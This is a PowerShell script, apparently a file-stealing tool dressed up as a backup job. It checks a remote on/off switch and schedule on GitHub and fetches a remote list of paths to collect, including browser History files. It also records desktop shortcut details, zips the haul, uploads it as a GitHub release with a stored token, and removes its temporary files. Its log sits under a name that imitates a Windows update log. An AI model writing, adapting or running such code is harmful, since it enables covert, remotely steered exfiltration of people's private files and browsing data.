$logPath = "C:\ProgramData\Microsoft\Windows\update-log.txt"
function Log($msg) {
    $line = "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss") | $msg"
    $line | Out-File -FilePath $logPath -Append -Encoding utf8
    Write-Host $line
}

# 清理 30 天前的日志
if (Test-Path $logPath) {
    $logFile = Get-Item $logPath
    if ($logFile.LastWriteTime -lt (Get-Date).AddDays(-30)) {
        Remove-Item $logPath -Force -ErrorAction SilentlyContinue
        Log "🪑 已清理过期日志"
    }
}

Log "`n============== New Execution =============="

# 时间控制检查
function ShouldRun {
    $url = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/.github/time-control.txt"
    try {
        $content = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
        $lines = $content.Content -split "`n" | ForEach-Object { $_.Trim() }
        Log "✅ 成功加载 time-control.txt，共 $($lines.Count) 行"
    } catch {
        Log "❌ 加载 time-control.txt 失败：$($_.Exception.Message)"
        return $false
    }

    if ($lines.Count -eq 0 -or $lines[0].ToLower() -ne "on") {
        Log "⛔ 远程控制开关为 off，跳过执行"
        return $false
    }

    $now = Get-Date
    $nowTime = $now.TimeOfDay
    $nowHour = $now.Hour
    $nowMinute = $now.Minute

    foreach ($line in $lines | Select-Object -Skip 1) {
        if ($line -match "^(\d{2}):(\d{2})-(\d{2}):(\d{2})\s+every\s+(\d+)([mh])$") {
            $start = New-TimeSpan -Hours $matches[1] -Minutes $matches[2]
            $end   = New-TimeSpan -Hours $matches[3] -Minutes $matches[4]
            $unit  = $matches[6]
            $interval = [int]$matches[5]

            if ($nowTime -ge $start -and $nowTime -lt $end) {
                if ($unit -eq "m" -and ($nowMinute % $interval -eq 0)) {
                    Log "✅ 当前时间满足条件：$line"
                    return $true
                }
                if ($unit -eq "h" -and ($nowMinute -eq 0 -and ($nowHour % $interval -eq 0))) {
                    Log "✅ 当前时间满足条件：$line"
                    return $true
                }
            }
        }
    }

    Log "⛔ 当前时间不满足任何条件，跳过执行"
    return $false
}

if (-not (ShouldRun)) { return }

# 读取环境变量
$token = $env:GH_TOKEN
if (-not $token) { $token = $env:GITHUB_TOKEN }
if (-not $token) {
    Log "❌ 未检测到 GH_TOKEN 或 GITHUB_TOKEN 环境变量，终止上传"
    return
}

# 基础设置
$repo = "ertgyhujkfghj/2"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# 加载路径列表
$remoteTxtUrl = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    Log "✅ 成功加载上传路径，共 $($pathList.Count) 项"
} catch {
    Log "❌ 加载上传路径失败：$($_.Exception.Message)"
    return
}

# 拷贝文件
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"
    if (-not (Test-Path $path)) {
        Log "⚠️ 路径不存在：$path"
        continue
    }
    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
        Log "✅ 拷贝成功：$path"
    } catch {
        Log "❌ 拷贝失败：$path ：$($_.Exception.Message)"
    }
}

# 提取桌面快捷方式
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""
    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`nTargetPath: $($shortcut.TargetPath)`nArguments: $($shortcut.Arguments)`nStartIn: $($shortcut.WorkingDirectory)`nIcon: $($shortcut.IconLocation)`n-----------`n"
    }
    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
    Log "✅ 已提取桌面快捷方式"
} catch {
    Log "❌ 快捷方式提取失败：$($_.Exception.Message)"
}

# 压缩
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
    Log "✅ 压缩成功：$zipPath"
} catch {
    Log "❌ 压缩失败：$($_.Exception.Message)"
    return
}

# 创建 Release
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file package from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
    Log "✅ 创建 Release 成功"
} catch {
    Log "❌ 创建 Release 失败：$($_.Exception.Message)"
    return
}

# 上传 ZIP（带重试）
$uploadSuccess = $false
for ($i = 1; $i -le 2; $i++) {
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
        $uploadHeaders = @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
            "User-Agent" = "PowerShellScript"
        }
        Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
        Log "✅ 第 $i 次上传成功"
        $uploadSuccess = $true
        break
    } catch {
        Log "⚠️ 第 $i 次上传失败：$($_.Exception.Message)"
        Start-Sleep -Seconds 5
    }
}
if (-not $uploadSuccess) {
    Log "❌ 所有尝试上传均失败"
}

# 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Log "✅ 清理完毕，执行结束"
Log "============== End ==============\n"
